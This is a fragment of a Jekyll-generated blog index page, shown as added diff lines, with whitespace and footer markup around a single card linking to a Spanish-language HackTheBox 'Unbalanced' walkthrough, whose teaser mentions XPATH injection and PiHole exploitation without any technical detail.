+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/unbalanced">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268banner.png" alt="HackTheBox - Unbalanced"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/unbalanced">HackTheBox - Unbalanced</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Nos enfrentaremos con encriptación, mucho jugueteo con XML (romperemos una clave y encontraremos un XPATH injection que automatizaremos para extraer credenciales), explotaremos PiHole y sobre todo,...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">04 Dec 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
